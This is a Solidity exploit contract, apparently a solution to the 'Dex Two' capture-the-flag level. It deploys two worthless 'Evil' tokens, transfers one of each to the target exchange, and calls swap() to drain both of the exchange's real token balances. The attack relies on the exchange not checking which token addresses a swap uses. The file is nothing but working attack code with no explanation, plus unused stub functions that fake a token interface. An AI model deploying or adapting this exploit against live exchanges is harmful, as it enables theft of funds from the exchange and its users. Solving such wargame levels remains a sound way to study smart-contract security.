// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import "./DexTwo.sol";

contract DexTwoHack {
    DexTwo dexTwo;
    SwappableTokenTwo evilToken1;
    SwappableTokenTwo evilToken2;

    constructor(DexTwo _dexTwo) {
        dexTwo = _dexTwo;
        evilToken1 = new SwappableTokenTwo("Evil Token 1", "EVIL1", 2);
        evilToken2 = new SwappableTokenTwo("Evil Token 2", "EVIL2", 2);
    }

    function balanceOf(address) public view returns (uint256 balance) {
        balance = 1;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        return true;
    }

    function attack() external {
        evilToken1.approve(address(dexTwo), 1);
        evilToken2.approve(address(dexTwo), 1);

        evilToken1.transfer(address(dexTwo), 1);
        evilToken2.transfer(address(dexTwo), 1);

        dexTwo.swap(address(evilToken1), dexTwo.token1(), 1);
        dexTwo.swap(address(evilToken2), dexTwo.token2(), 1);
    }
}
